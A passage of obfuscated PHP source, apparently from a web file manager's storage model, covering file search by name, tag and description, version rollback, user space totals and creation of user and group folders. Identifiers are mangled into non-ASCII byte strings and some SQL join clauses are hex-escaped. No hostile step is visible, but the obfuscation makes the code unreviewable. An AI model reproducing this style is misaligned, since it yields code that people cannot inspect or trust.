$_SERVER[¼èá¯æÙ]; return $this->where(array($ş¦ñ¨ªë[504] => $îŒ¬¼¬))->save(array($ş¦ñ¨ªë[2234] => $¤ôø£½†)); } public function rollbackToItem($ù„áçã­, $Œ‡Ö®) { $×«ƒÅ©É =& $_SERVER[¼èá¯æÙ]; $ÆßšÊí = Model($×«ƒÅ©É[907])->sourceInfo($ù„áçã­); $this->addHistory($ÆßšÊí, LNG($×«ƒÅ©É[2245])); $š²›¢©Ò = $this->find($Œ‡Ö®); $Ø¦ëšÅŸ = array($×«ƒÅ©É[552] => $š²›¢©Ò[$×«ƒÅ©É[552]], $×«ƒÅ©É[89] => $š²›¢©Ò[$×«ƒÅ©É[89]], $×«ƒÅ©É[98] => time(), $×«ƒÅ©É[540] => USER_ID); Model($×«ƒÅ©É[907])->where(array($×«ƒÅ©É[203] => $ù„áçã­))->save($Ø¦ëšÅŸ); return $this->where(array($×«ƒÅ©É[504] => $Œ‡Ö®))->delete(); } public function clearSame($±º«Ó½æ) { $ë®°ıôß =& $_SERVER[¼èá¯æÙ]; $¨ã‘üä€ = $this->listData($±º«Ó½æ); $“ß¶°Ÿ = array_to_keyvalue_group($¨ã‘üä€, $ë®°ıôß[552]); $˜”Ó…æ = array(); $Î¨ú¦ˆœ = array(); foreach ($“ß¶°Ÿ as $·×çÂ«€) { if (!$·×çÂ«€ || count($·×çÂ«€) <= 1) { continue; } foreach ($·×çÂ«€ as $ª¹¦ãÛÙ) { $˜”Ó…æ[] = $ª¹¦ãÛÙ[$ë®°ıôß[552]]; $Î¨ú¦ˆœ[] = $ª¹¦ãÛÙ[$ë®°ıôß[486]]; } } if (!$Î¨ú¦ˆœ) { return; } $this->where(array($ë®°ıôß[486] => array($ë®°ıôß[7], $Î¨ú¦ˆœ)))->delete(); Model($ë®°ıôß[555])->remove($˜”Ó…æ); } public function userSpace() { $—ƒªºÄµ =& $_SERVER[¼èá¯æÙ]; $Ó¤ßÇÈ± = $this->tablePrefix; $£€½Ÿ˜¼ = array($—ƒªºÄµ[1769] => USER_ID); $ıÛ£š  = "{$Ó¤ßÇÈ±}\x69\157\x5f\146\151\154\x65\x20\146\151\154\x65\x73\40\x6f\x6e\x20\x66\151\x6c\145\163\56\146\151\x6c\145\111\104\40\75\x20\x68\x69\163\164\157\162\171\x2e\146\151\x6c\145\111\x44"; return $this->alias($—ƒªºÄµ[2243])->where($£€½Ÿ˜¼)->join($ıÛ£š , $—ƒªºÄµ[2244])->sum($—ƒªºÄµ[89]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ŒÓ–®Š†) { $‹š—ÔèÏ =& $_SERVER[¼èá¯æÙ]; $¹™¥– = KodIO::fileTypeList(); $ÙñàÂÇÈ = $¹™¥–[$ŒÓ–®Š†]; if (!$ÙñàÂÇÈ) { return array(); } $¼½’î·ç = $ÙñàÂÇÈ[$‹š—ÔèÏ[179]]; $ŠÉã¯Ì² = $‹š—ÔèÏ[7]; if (!$ÙñàÂÇÈ[$‹š—ÔèÏ[179]]) { $…Ç×³´ = array_to_keyvalue($¹™¥–, $‹š—ÔèÏ[12], $‹š—ÔèÏ[179]); $¼½’î·ç = implode($‹š—ÔèÏ[50], $…Ç×³´); $ŠÉã¯Ì² = $‹š—ÔèÏ[2246]; } $¿™€‚ã‡ = explode($‹š—ÔèÏ[50], trim($¼½’î·ç, $‹š—ÔèÏ[50])); return array($ŠÉã¯Ì², $¿™€‚ã‡); } public function listPathType($°é»‚…) { $É´èàã¢ =& $_SERVER[¼èá¯æÙ]; $á¸ûøòÀ = $this->fileTypeWhere($°é»‚…); if (!$á¸ûøòÀ) { return array(); } $€˜ìµ¤ƒ = USER_ID; $û­³ˆ‘Ë = Model($É´èàã¢[608])->getInfo($€˜ìµ¤ƒ); $ó§®¨¾° = array($É´èàã¢[662] => SourceModel::TYPE_USER, $É´èàã¢[595] => array($É´èàã¢[626], $É´èàã¢[604] . $û­³ˆ‘Ë[$É´èàã¢[100]][$É´èàã¢[203]] . $É´èàã¢[627]), $É´èàã¢[663] => $€˜ìµ¤ƒ, $É´èàã¢[660] => 0, $É´èàã¢[661] => $á¸ûøòÀ); return $this->listSource($ó§®¨¾°); } public function listSearch($Ğ®ã¿, $÷„‹ÕÖ = 300) { $À“…úöé =& $_SERVER[¼èá¯æÙ]; if (isset($Ğ®ã¿[$À“…úöé[2077]]) && $Ğ®ã¿[$À“…úöé[2077]]) { $Ğ®ã¿[$À“…úöé[2077]] = str_replace($À“…úöé[471], $À“…úöé[2247], trim($Ğ®ã¿[$À“…úöé[2077]])); } $˜§í¥† = $this->_parseSearchWhere($Ğ®ã¿); if (!isset($˜§í¥†[$À“…úöé[516]])) { $˜§í¥†[$À“…úöé[516]] = 0; } $ôÁÀ·Ü‘ = $À“…úöé[2248]; $ß«†‡à± = $˜§í¥†; $ö±õ££± = $ôÁÀ·Ü‘; $this->_listSearchBindPinyin($Ğ®ã¿, $˜§í¥†, $ôÁÀ·Ü‘); $this->alias($À“…úöé[530])->_makeOrder(); $˜§í¥† = $this->parseWhereLike($˜§í¥†); $•ÊÏ“ = $this->distinct(!0)->field($ôÁÀ·Ü‘)->where($˜§í¥†)->selectPage($÷„‹ÕÖ); if ($GLOBALS[$À“…úöé[6]][$À“…úöé[468]][$À“…úöé[469]] && Input::check($Ğ®ã¿[$À“…úöé[2077]], $À“…úöé[669]) && $•ÊÏ“[$À“…úöé[454]][$À“…úöé[440]] == 1 && $•ÊÏ“[$À“…úöé[454]][$À“…úöé[455]] == 0) { $•ÊÏ“ = $this->distinct(!0)->field($ôÁÀ·Ü‘)->where($ß«†‡à±)->limit(1000)->select(); $•ÊÏ“ = array_page_split($•ÊÏ“, !1, $÷„‹ÕÖ); } $this->_listSearchFileContent($•ÊÏ“, $Ğ®ã¿, $ö±õ££±, $ß«†‡à±); $this->_listSearchDesc($•ÊÏ“, $Ğ®ã¿, $ö±õ££±); $this->_listSearchTag($•ÊÏ“, $Ğ®ã¿, $ö±õ££±); $this->_listSearchGroupTag($•ÊÏ“, $Ğ®ã¿, $ö±õ££±); $this->_listDataApply($•ÊÏ“[$À“…úöé[457]]); $this->_listMake($•ÊÏ“); return $•ÊÏ“; } private function _listSearchFileContent(&$„ÌÂÙ¸ˆ, $æåğ´‘, $˜ÀºËï, $ÆûÔ¶Ô´) { $“¦£î”¤ =& $_SERVER[¼èá¯æÙ]; if (!$æåğ´‘[$“¦£î”¤[2077]] || $„ÌÂÙ¸ˆ[$“¦£î”¤[454]][$“¦£î”¤[440]] > 1) { return; } if (!isset($ÆûÔ¶Ô´[$“¦£î”¤[32]]) || !is_array($æåğ´‘[$“¦£î”¤[552]])) { return; } $ÆûÔ¶Ô´[$“¦£î”¤[552]] = array($“¦£î”¤[7], $æåğ´‘[$“¦£î”¤[552]]); unset($ÆûÔ¶Ô´[$“¦£î”¤[32]]); unset($æåğ´‘[$“¦£î”¤[552]]); $ÍÚ›Ã  = $this->field($˜ÀºËï)->where($ÆûÔ¶Ô´)->limit($“¦£î”¤[2249])->select(); if (!$ÍÚ›Ã  || count($ÍÚ›Ã ) == 0) { return; } $„ÌÂÙ¸ˆ[$“¦£î”¤[457]] = array_merge($ÍÚ›Ã , $„ÌÂÙ¸ˆ[$“¦£î”¤[457]]); $„ÌÂÙ¸ˆ[$“¦£î”¤[454]][$“¦£î”¤[455]] += count($ÍÚ›Ã ); } private function _listSearchTag(&$Ä¿å­¹, $ÂìÕÀŞÖ, $ ÀôçŠ) { $—‚û’Ä× =& $_SERVER[¼èá¯æÙ]; if (!$ÂìÕÀŞÖ[$—‚û’Ä×[2077]] || $Ä¿å­¹[$—‚û’Ä×[454]][$—‚û’Ä×[440]] > 1) { return; } $ÆÉˆ…°¿ = Model($—‚û’Ä×[2250])->listData(); $„¹üç˜• = array(); $Ôåı£¾Ô = $ÂìÕÀŞÖ[$—‚û’Ä×[2077]]; foreach ($ÆÉˆ…°¿ as $ÛÊÇü…) { $ÛØªŠ° = $ÛÊÇü…[$—‚û’Ä×[32]]; $Ë°Ğ‰Õ = str_replace($—‚û’Ä×[53], $—‚û’Ä×[12], Pinyin::get($ÛØªŠ°)); if (stripos($ÛØªŠ°, $Ôåı£¾Ô) !== !1 || stripos($Ë°Ğ‰Õ, $Ôåı£¾Ô) !== !1) { $„¹üç˜•[] = $ÛÊÇü…[$—‚û’Ä×[486]]; } } if (!$„¹üç˜•) { return; } $¥¤ãêŠü = array($—‚û’Ä×[511] => array($—‚û’Ä×[7], $„¹üç˜•), $—‚û’Ä×[1778] => USER_ID); $˜éÕ‹øÍ = Model($—‚û’Ä×[513])->field($—‚û’Ä×[97])->where($¥¤ãêŠü)->select(); $˜éÕ‹øÍ = array_to_keyvalue($˜éÕ‹øÍ, $—‚û’Ä×[12], $—‚û’Ä×[97]); $¹¸õÚ¹Ó = array_unique($˜éÕ‹øÍ); $this->_listSearchMerge($Ä¿å­¹, $ÂìÕÀŞÖ, $ ÀôçŠ, $¹¸õÚ¹Ó); } private function _listSearchDesc(&$±»ŞõÔ¿, $õŸÓ¸É, $í£ç³ÙÊ) { $¼Ü¯ƒ =& $_SERVER[¼èá¯æÙ]; if (!$õŸÓ¸É[$¼Ü¯ƒ[2077]] || $±»ŞõÔ¿[$¼Ü¯ƒ[454]][$¼Ü¯ƒ[440]] > 1) { return; } $¯â¶¢Ş— = array($¼Ü¯ƒ[107] => $¼Ü¯ƒ[537], $¼Ü¯ƒ[462] => array($¼Ü¯ƒ[470], $¼Ü¯ƒ[2079] . $õŸÓ¸É[$¼Ü¯ƒ[2077]] . $¼Ü¯ƒ[2079])); $Ó‡¦– = !1; if ($Ó‡¦–) { $İ®û•Î¹ = $this->listSearchChildren($õŸÓ¸É[$¼Ü¯ƒ[202]]); $İ®û•Î¹ = array_unique($İ®û•Î¹); if (!$İ®û•Î¹) { return; } $¯â¶¢Ş—[$¼Ü¯ƒ[203]] = array($¼Ü¯ƒ[7], $İ®û•Î¹); } $ÓË—î§“ = Model($¼Ü¯ƒ[646])->field($¼Ü¯ƒ[203])->where($¯â¶¢Ş—)->limit(5000)->select(); $¬º÷Ä¹ = array_to_keyvalue($ÓË—î§“, $¼Ü¯ƒ[12], $¼Ü¯ƒ[203]); $this->_listSearchMerge($±»ŞõÔ¿, $õŸÓ¸É, $í£ç³ÙÊ, $¬º÷Ä¹); } private function _listSearchGroupTag(&$›‚ºëıÙ, $×«ÏÁ÷Ë, $ÚõŠü¨“) { $àƒØ†î° =& $_SERVER[¼èá¯æÙ]; if (!$×«ÏÁ÷Ë[$àƒØ†î°[2077]] || $›‚ºëıÙ[$àƒØ†î°[454]][$àƒØ†î°[440]] > 1 || !$×«ÏÁ÷Ë[$àƒØ†î°[202]]) { return; } $ÒæÒ‘Ùè = $this->sourceInfo($×«ÏÁ÷Ë[$àƒØ†î°[202]]); if (!$ÒæÒ‘Ùè || $ÒæÒ‘Ùè[$àƒØ†î°[200]] != SourceModel::TYPE_GROUP) { return; } $™® ÎÜ¶ = $ÒæÒ‘Ùè[$àƒØ†î°[580]]; $òáÃÕˆÇ = Model($àƒØ†î°[2251])->get($™® ÎÜ¶); $ˆ£‚ÀÒ® = array(); $’±îÏÀ¢ = $×«ÏÁ÷Ë[$àƒØ†î°[2077]]; foreach ($òáÃÕˆÇ[$àƒØ†î°[457]] as $ØƒªĞ°ñ) { $Îñâ‚çğ = $ØƒªĞ°ñ[$àƒØ†î°[32]]; $¦¸›Ş­› = str_replace($àƒØ†î°[53], $àƒØ†î°[12], Pinyin::get($Îñâ‚çğ)); if (stripos($Îñâ‚çğ, $’±îÏÀ¢) !== !1 || stripos($¦¸›Ş­›, $’±îÏÀ¢) !== !1) { $ˆ£‚ÀÒ®[] = $ØƒªĞ°ñ[$àƒØ†î°[486]]; } } if (!$ˆ£‚ÀÒ®) { return; } $–æïßóû = array($àƒØ†î°[511] => array($àƒØ†î°[7], $ˆ£‚ÀÒ®), $àƒØ†î°[1778] => 0, $àƒØ†î°[33] => $àƒØ†î°[2099] . $™® ÎÜ¶); $÷²ÊÜ˜Ÿ = Model($àƒØ†î°[513])->field($àƒØ†î°[97])->where($–æïßóû)->select(); $÷²ÊÜ˜Ÿ = array_to_keyvalue($÷²ÊÜ˜Ÿ, $àƒØ†î°[12], $àƒØ†î°[97]); $Ç€ÜÌ¬À = array_unique($÷²ÊÜ˜Ÿ); $this->_listSearchMerge($›‚ºëıÙ, $×«ÏÁ÷Ë, $ÚõŠü¨“, $Ç€ÜÌ¬À); } private function _listSearchMerge(&$«ş½Ñ÷, $›½öê‘, $«³ÕµíÚ, $‹ÅÈ½Ûá) { $¯¸©Ê×à =& $_SERVER[¼èá¯æÙ]; if (!$‹ÅÈ½Ûá) { return; } $ê’£® = array_to_keyvalue($«ş½Ñ÷[$¯¸©Ê×à[457]], $¯¸©Ê×à[12], $¯¸©Ê×à[203]); $ú‡İ† = array_diff($‹ÅÈ½Ûá, $ê’£®); if (!$ú‡İ†) { return; } $ÊìšµËÛ = array($¯¸©Ê×à[203] => array($¯¸©Ê×à[7], $ú‡İ†)); $Ğºúôæ€ = $this->field($«³ÕµíÚ)->where($ÊìšµËÛ)->select(); if (!$Ğºúôæ€) { return; } $”àíÔ–¨ = array(); foreach ($Ğºúôæ€ as $¦¢ó‡ğÔ) { if ($this->_listSearchFilter($¦¢ó‡ğÔ, $›½öê‘)) { $”àíÔ–¨[] = $¦¢ó‡ğÔ; } } $«ş½Ñ÷[$¯¸©Ê×à[457]] = array_merge($”àíÔ–¨, $«ş½Ñ÷[$¯¸©Ê×à[457]]); $«ş½Ñ÷[$¯¸©Ê×à[454]][$¯¸©Ê×à[455]] += count($”àíÔ–¨); } private function _listSearchFilter($¿É·İÁƒ, $ùÅµ—ÆÊ) { $â§—û°Š =& $_SERVER[¼èá¯æÙ]; $—ë§ïÊù = $¿É·İÁƒ[$â§—û°Š[496]] == $â§—û°Š[101]; if (!strstr($¿É·İÁƒ[$â§—û°Š[595]], $â§—û°Š[50] . $ùÅµ—ÆÊ[$â§—û°Š[202]] . $â§—û°Š[50])) { return !1; } if (isset($ùÅµ—ÆÊ[$â§—û°Š[497]]) && $ùÅµ—ÆÊ[$â§—û°Š[497]] != $â§—û°Š[858]) { if ($ùÅµ—ÆÊ[$â§—û°Š[497]] == $â§—û°Š[88] && !$—ë§ïÊù) { return !1; } if ($ùÅµ—ÆÊ[$â§—û°Š[497]] != $â§—û°Š[88] && $—ë§ïÊù) { return !1; } if (!strstr($¿É·İÁƒ[$â§—û°Š[179]], $â§—û°Š[50] . $ùÅµ—ÆÊ[$â§—û°Š[497]] . $â§—û°Š[50])) { return !1; } } if (isset($ùÅµ—ÆÊ[$â§—û°Š[2252]]) && $ùÅµ—ÆÊ[$â§—û°Š[2252]] < $¿É·İÁƒ[$â§—û°Š[89]]) { return !1; } if (isset($ùÅµ—ÆÊ[$â§—û°Š[2253]]) && $ùÅµ—ÆÊ[$â§—û°Š[2253]] > $¿É·İÁƒ[$â§—û°Š[89]]) { return !1; } if (isset($ùÅµ—ÆÊ[$â§—û°Š[676]]) && $ùÅµ—ÆÊ[$â§—û°Š[676]] != $¿É·İÁƒ[$â§—û°Š[540]]) { return !1; } return !0; } public function listSearchChildren($İ¢Ô‘Ôê, $ñ•õ®İ = 5000) { $¥êÁàÀ“ =& $_SERVER[¼èá¯æÙ]; $ü™“®ã¿ = array(); $é©”î¨ = $this->sourceInfo($İ¢Ô‘Ôê); $¿ÖÜÁªÂ = array($¥êÁàÀ“[595] => array($¥êÁàÀ“[470], $é©”î¨[$¥êÁàÀ“[595]] . $é©”î¨[$¥êÁàÀ“[203]] . $¥êÁàÀ“[627])); $î–®£ŒÑ = $this->field($¥êÁàÀ“[89])->where($¿ÖÜÁªÂ)->limit($ñ•õ®İ + 1)->select(); $¹òÜóÃÔ = is_array($î–®£ŒÑ) ? count($î–®£ŒÑ) : 0; if ($¹òÜóÃÔ > $ñ•õ®İ) { return $this->_listSearchChildrenNear($İ¢Ô‘Ôê, $ñ•õ®İ); } $É®’Ñú = $this->field($¥êÁàÀ“[203])->where($¿ÖÜÁªÂ)->select(); $ü™“®ã¿ = array_to_keyvalue($É®’Ñú, $¥êÁàÀ“[12], $¥êÁàÀ“[203]); return $ü™“®ã¿; } private function _listSearchChildrenNear($ß€ˆÙ±”, $ß‘¯) { $°Á§ØÛ˜ =& $_SERVER[¼èá¯æÙ]; $•ü€•ó’ = array(); $¼Ûëùã“ = array($°Á§ØÛ˜[202] => $ß€ˆÙ±”); $œ×ôà¡ê = $this->field($°Á§ØÛ˜[2254])->where($¼Ûëùã“)->select(); $©µ·ô = array_to_keyvalue(array_filter_by_field($œ×ôà¡ê, $°Á§ØÛ˜[496], $°Á§ØÛ˜[101]), $°Á§ØÛ˜[12], $°Á§ØÛ˜[203]); $•ü€•ó’ = array_merge($•ü€•ó’, array_to_keyvalue($œ×ôà¡ê, $°Á§ØÛ˜[12], $°Á§ØÛ˜[203])); if (!$©µ·ô) { return $•ü€•ó’; } $¼Ûëùã“ = array($°Á§ØÛ˜[202] => array($°Á§ØÛ˜[7], $©µ·ô)); $œ×ôà¡ê = $this->field($°Á§ØÛ˜[2254])->where($¼Ûëùã“)->limit($ß‘¯)->select(); $•ü€•ó’ = array_merge($•ü€•ó’, array_to_keyvalue($œ×ôà¡ê, $°Á§ØÛ˜[12], $°Á§ØÛ˜[203])); $•ü€•ó’ = array_slice($•ü€•ó’, 0, intval($ß‘¯)); return $•ü€•ó’; } private function _listSearchBindPinyin($ó”Èîüñ, &$¬†¿×±†, &$÷Œ· ¬Š) { $îœ¯ˆœÖ =& $_SERVER[¼èá¯æÙ]; if (!isset($ó”Èîüñ[$îœ¯ˆœÖ[2077]]) || !$ó”Èîüñ[$îœ¯ˆœÖ[2077]]) { return; } if (!Input::check($ó”Èîüñ[$îœ¯ˆœÖ[2077]], $îœ¯ˆœÖ[405]) || strlen($ó”Èîüñ[$îœ¯ˆœÖ[2077]]) < 2) { return; } $Ì¼¶¡´Æ = "\114\x45\x46\x54\40\x4a\x4f\x49\116\40{$this->tablePrefix}\x69\x6f\137\x73\x6f\165\x72\x63\x65\137\155\x65\x74\141\x20\155\x65\164\141\40\157\x6e\40\x73\157\165\x72\143\x65\56\163\157\x75\x72\x63\x65\x49\104\x20\x3d\40\x6d\x65\x74\141\56\163\x6f\165\162\143\x65\x49\x44"; $ˆ·“¾İ = array(); $÷Œ· ¬Š = str_replace(array($îœ¯ˆœÖ[59], $îœ¯ˆœÖ[53], $îœ¯ˆœÖ[2255]), $îœ¯ˆœÖ[12], $÷Œ· ¬Š); $÷Œ· ¬Š = $îœ¯ˆœÖ[522] . str_replace($îœ¯ˆœÖ[50], $îœ¯ˆœÖ[523], $÷Œ· ¬Š); $×µ›Ò½ş = $¬†¿×±†[$îœ¯ˆœÖ[32]]; unset($¬†¿×±†[$îœ¯ˆœÖ[32]]); foreach ($¬†¿×±† as $°ŞûÕ«¯ => $Å‚åö½š) { $ˆ·“¾İ[$îœ¯ˆœÖ[522] . $°ŞûÕ«¯] = $Å‚åö½š; } foreach ($×µ›Ò½ş as $²û­ è•) { $ˆ·“¾İ[] = array($îœ¯ˆœÖ[527] => $²û­ è•, $îœ¯ˆœÖ[1082] => $îœ¯ˆœÖ[2081], array($îœ¯ˆœÖ[2256] => $²û­ è•, $îœ¯ˆœÖ[2257] => array($îœ¯ˆœÖ[7], array($îœ¯ˆœÖ[549], $îœ¯ˆœÖ[548])))); } $this->join($Ì¼¶¡´Æ); $¬†¿×±† = $ˆ·“¾İ; } private function _parseSearchWhere($éà¯¯İ) { $À­ĞĞß° =& $_SERVER[¼èá¯æÙ]; $Š§¿È = array(); if (isset($éà¯¯İ[$À­ĞĞß°[842]]) && $éà¯¯İ[$À­ĞĞß°[842]]) { $Š§¿È[$À­ĞĞß°[98]] = array($À­ĞĞß°[2258], $éà¯¯İ[$À­ĞĞß°[842]]); } if (isset($éà¯¯İ[$À­ĞĞß°[843]]) && $éà¯¯İ[$À­ĞĞß°[843]]) { $œ«‚‹Øİ = array($À­ĞĞß°[2259], $éà¯¯İ[$À­ĞĞß°[843]]); if ($Š§¿È[$À­ĞĞß°[98]]) { $Š§¿È[$À­ĞĞß°[98]] = array($Š§¿È[$À­ĞĞß°[98]], $œ«‚‹Øİ, $À­ĞĞß°[2260]); } else { $Š§¿È[$À­ĞĞß°[98]] = $œ«‚‹Øİ; } } if (isset($éà¯¯İ[$À­ĞĞß°[2252]]) && $éà¯¯İ[$À­ĞĞß°[2252]] > 0) { $Š§¿È[$À­ĞĞß°[89]] = array($À­ĞĞß°[2258], $éà¯¯İ[$À­ĞĞß°[2252]]); } if (isset($éà¯¯İ[$À­ĞĞß°[2253]]) && $éà¯¯İ[$À­ĞĞß°[2253]]) { $œ«‚‹Øİ = array($À­ĞĞß°[2259], $éà¯¯İ[$À­ĞĞß°[2253]]); if ($Š§¿È[$À­ĞĞß°[89]]) { $Š§¿È[$À­ĞĞß°[89]] = array($Š§¿È[$À­ĞĞß°[89]], $œ«‚‹Øİ, $À­ĞĞß°[2260]); } else { $Š§¿È[$À­ĞĞß°[89]] = $œ«‚‹Øİ; } } if (isset($éà¯¯İ[$À­ĞĞß°[676]]) && $éà¯¯İ[$À­ĞĞß°[676]]) { $Š§¿È[] = array($À­ĞĞß°[540] => $éà¯¯İ[$À­ĞĞß°[676]], $À­ĞĞß°[538] => $éà¯¯İ[$À­ĞĞß°[676]], $À­ĞĞß°[1082] => $À­ĞĞß°[2081]); } if (isset($éà¯¯İ[$À­ĞĞß°[497]]) && $éà¯¯İ[$À­ĞĞß°[497]]) { $‚œĞÆ´Î = $éà¯¯İ[$À­ĞĞß°[497]]; if ($‚œĞÆ´Î == $À­ĞĞß°[88]) { $Š§¿È[$À­ĞĞß°[496]] = 1; } else { if ($‚œĞÆ´Î == $À­ĞĞß°[2261]) { $Š§¿È[$À­ĞĞß°[496]] = 0; } else { if ($‚œĞÆ´Î) { $‚œĞÆ´Î = is_array($‚œĞÆ´Î) ? $‚œĞÆ´Î : explode($À­ĞĞß°[50], $‚œĞÆ´Î); $Š§¿È[$À­ĞĞß°[497]] = array($À­ĞĞß°[503], $‚œĞÆ´Î); $Š§¿È[$À­ĞĞß°[496]] = 0; } } } } $this->_parseSearchParent($éà¯¯İ, $Š§¿È); if (isset($éà¯¯İ[$À­ĞĞß°[2077]]) && trim($éà¯¯İ[$À­ĞĞß°[2077]])) { $•¯Ä¯± = trim($éà¯¯İ[$À­ĞĞß°[2077]]); $ä…·ş¼í = explode($À­ĞĞß°[53], $•¯Ä¯±); if (strlen($•¯Ä¯±) > 2 && (substr($•¯Ä¯±, 0, 1) == $À­ĞĞß°[131] && substr($•¯Ä¯±, -1) == $À­ĞĞß°[131]) || substr($•¯Ä¯±, 0, 1) == $À­ĞĞß°[68] && substr($•¯Ä¯±, -1) == $À­ĞĞß°[68]) { $•¯Ä¯± = substr($•¯Ä¯±, 1, -1); $ä…·ş¼í = array($•¯Ä¯±); } $Š§¿È[$À­ĞĞß°[32]] = array(array($À­ĞĞß°[626], $À­ĞĞß°[2079] . $•¯Ä¯± . $À­ĞĞß°[2079])); if (count($ä…·ş¼í) > 1) { $Š§¿È[$À­ĞĞß°[32]] = array(); foreach ($ä…·ş¼í as $ã¹Òíµ) { if (!trim($ã¹Òíµ)) { continue; } $Š§¿È[$À­ĞĞß°[32]][] = array($À­ĞĞß°[626], $À­ĞĞß°[2079] . trim($ã¹Òíµ) . $À­ĞĞß°[2079]); } } } return $Š§¿È; } private function _parseSearchParent($–ü’ß, &$Å‚İè­Î) { $Ê’¾éî =& $_SERVER[¼èá¯æÙ]; if (!isset($–ü’ß[$Ê’¾éî[202]]) || !$–ü’ß[$Ê’¾éî[202]]) { return; } $„·ø¨Öà = $this->pathInfo($–ü’ß[$Ê’¾éî[202]]); $ÃÎ½…ƒ‚ = $„·ø¨Öà[$Ê’¾éî[202]] . $Ê’¾éî[12] === $Ê’¾éî[240]; $åÉÒ×¥Š = $„·ø¨Öà[$Ê’¾éî[200]] == $Ê’¾éî[589]; if ($„·ø¨Öà[$Ê’¾éî[605]] == $Ê’¾éî[606]) { $’›²»ÔÂ = $this->sourceInfo($–ü’ß[$Ê’¾éî[202]]); $„·ø¨Öà[$Ê’¾éî[595]] = $’›²»ÔÂ[$Ê’¾éî[595]]; } $Å‚İè­Î[$Ê’¾éî[666]] = array($Ê’¾éî[626], $„·ø¨Öà[$Ê’¾éî[595]] . $–ü’ß[$Ê’¾éî[202]] . $Ê’¾éî[627]); $Úå£Øª = isset($–ü’ß[$Ê’¾éî[1937]]) && in_array($Ê’¾éî[589], $–ü’ß[$Ê’¾éî[1937]]); if (!$Úå£Øª || !$åÉÒ×¥Š || !$ÃÎ½…ƒ‚ || !$„·ø¨Öà[$Ê’¾éî[498]]) { return; } if (!AuthModel::authCheckRoot($„·ø¨Öà[$Ê’¾éî[498]][$Ê’¾éî[499]])) { return; } $îÚä„í = $„·ø¨Öà[$Ê’¾éî[580]] . $Ê’¾éî[12]; if ($îÚä„í == $Ê’¾éî[101]) { unset($Å‚İè­Î[$Ê’¾éî[666]]); $Å‚İè­Î[$Ê’¾éî[200]] = self::TYPE_GROUP; return; } $…äÃœœñ = Model($Ê’¾éî[596])->groupChildrenAll($îÚä„í); $ÆµÕµµŒ = count($…äÃœœñ); if ($ÆµÕµµŒ <= 1) { return; } $½ç·©½ = array($Ê’¾éî[202] => 0, $Ê’¾éî[200] => self::TYPE_GROUP, $Ê’¾éî[580] => array($Ê’¾éî[7], $…äÃœœñ)); $ì¹‡ÕÉ = $this->field($Ê’¾éî[2262])->where($½ç·©½)->limit($ÆµÕµµŒ)->select(); $Å‚İè­Î[$Ê’¾éî[666]] = array(); foreach ($ì¹‡ÕÉ as $ïƒîŸ™ä) { $Å‚İè­Î[$Ê’¾éî[666]][] = array($Ê’¾éî[626], $Ê’¾éî[604] . $ïƒîŸ™ä[$Ê’¾éî[203]] . $Ê’¾éî[627]); } $Å‚İè­Î[$Ê’¾éî[666]][] = $Ê’¾éî[2081]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($¹†ÌÌ°») { $åÓ‡àÇš =& $_SERVER[¼èá¯æÙ]; $ş¦ßÃ¯Ü = Model($åÓ‡àÇš[588])->where(array($åÓ‡àÇš[1769] => $¹†ÌÌ°»))->find(); $ééú½ï÷ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¹†ÌÌ°», $ş¦ßÃ¯Ü[$åÓ‡àÇš[32]]); $this->userDesktopAdd($ééú½ï÷); return $ééú½ï÷; } public function userDesktopAdd($ áúĞ‰’) { $¨à¼‰ß¸ =& $_SERVER[¼èá¯æÙ]; $¨¤‘ª” = LNG($¨à¼‰ß¸[2263]); $”¶Ä§òÇ = $this->mkdir($ áúĞ‰’, $¨¤‘ª”); $this->metaSet($”¶Ä§òÇ, $¨à¼‰ß¸[2264], $¨à¼‰ß¸[101]); $this->metaSet($ áúĞ‰’, $¨à¼‰ß¸[2265], $”¶Ä§òÇ); } public function userPathSafeAdd($·íÓˆÛ…) { $ó”ºÜœ˜ =& $_SERVER[¼èá¯æÙ]; $÷´€ô¢â = Model($ó”ºÜœ˜[588])->getInfoFull($·íÓˆÛ…); if (!$÷´€ô¢â) { return !1; } if (_get($÷´€ô¢â, $ó”ºÜœ˜[609])) { return $÷´€ô¢â[$ó”ºÜœ˜[550]][$ó”ºÜœ˜[2266]]; } $ëÃÅÒ†² = $this->_mkdirRoot(SourceModel::TYPE_USER, $·íÓˆÛ…, $ó”ºÜœ˜[2267], $ó”ºÜœ˜[2268]); Model($ó”ºÜœ˜[588])->metaSet($·íÓˆÛ…, $ó”ºÜœ˜[2266], $ëÃÅÒ†²); $this->metaSet($ëÃÅÒ†², $ó”ºÜœ˜[2269], $·íÓˆÛ…); return $ëÃÅÒ†²; } public function userPathAppAdd($•ºç‰«, $Ìşš—ìœ = '', $´ŠÄÇª = '') { $¢½ØßæŠ =& $_SERVER[¼èá¯æÙ]; $ÈÎé¢Şò = Model($¢½ØßæŠ[588])->getInfoFull($•ºç‰«); if (!$ÈÎé¢Şò) { return !1; } $ş¹² = $ÈÎé¢Şò[$¢½ØßæŠ[550]] ? $ÈÎé¢Şò[$¢½ØßæŠ[550]] : array(); $ÔìÖÁ©” = $ş¹²[$¢½ØßæŠ[2270]]; if (!$ÔìÖÁ©”) { $ÔìÖÁ©” = $this->_mkdirRoot(SourceModel::TYPE_USER, $•ºç‰«, $¢½ØßæŠ[2271], $¢½ØßæŠ[2272]); Model($¢½ØßæŠ[588])->metaSet($•ºç‰«, $¢½ØßæŠ[2270], $ÔìÖÁ©” . $¢½ØßæŠ[12]); $this->metaSet($ÔìÖÁ©”, $¢½ØßæŠ[2270], $•ºç‰«); } if (!$Ìşš—ìœ) { return $ÔìÖÁ©”; } $÷ïÉó½ = $ş¹²[$¢½ØßæŠ[2273] . $Ìşš—ìœ]; if (!$÷ïÉó½) { $÷ïÉó½ = $this->mkdir($ÔìÖÁ©”, $Ìşš—ìœ); Model($¢½ØßæŠ[588])->metaSet($•ºç‰«, $¢½ØßæŠ[2273] . $Ìşš—ìœ, $÷ïÉó½); $this->metaSet($÷ïÉó½, $¢½ØßæŠ[2273] . $Ìşš—ìœ, $•ºç‰«); } if (!$´ŠÄÇª) { return $÷ïÉó½; } $öØ®¡á = $this->mkdir($÷ïÉó½, $´ŠÄÇª); return $öØ®¡á; } public function groupRootAdd($•Àê×°) { $áßèÓÇÜ =& $_SERVER[¼èá¯æÙ]; $ëğìäÊ‰ = Model($áßèÓÇÜ[596])->where(array($áßèÓÇÜ[2071] => $•Àê×°))->find(); return 